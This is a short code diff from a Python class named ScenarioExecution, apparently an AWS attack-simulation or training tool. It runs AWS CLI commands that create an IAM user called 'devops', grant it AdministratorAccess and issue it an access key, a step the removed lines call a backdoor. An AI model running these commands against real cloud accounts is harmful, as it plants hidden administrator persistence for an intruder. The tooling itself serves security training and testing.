@@ -81,10 +81,7 @@ class ScenarioExecution:
         print("-"*30)
         subprocess.call(""+creds+" && aws iam create-user --user-name devops --no-cli-pager", shell=True)
         subprocess.call(""+creds+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
-        print(colored("Backdoor User Access Key created", color="red"))
-        loading_animation()
-        print("-"*30)
-        subprocess.call(""+creds+" && aws iam create-access-key --user-name devops --no-cli-pager --query 'AccessKey.AccessKeyId'", shell=True)
+        subprocess.call(""+creds+" && aws iam create-access-key --user-name devops --no-cli-pager", shell=True)
 
         gen_report_2(self.API_GW_ID, self.LAMBDA_FUNC_ARN, self.API_GW_URL, self.LAMBDA_ROLE_NAME)
 
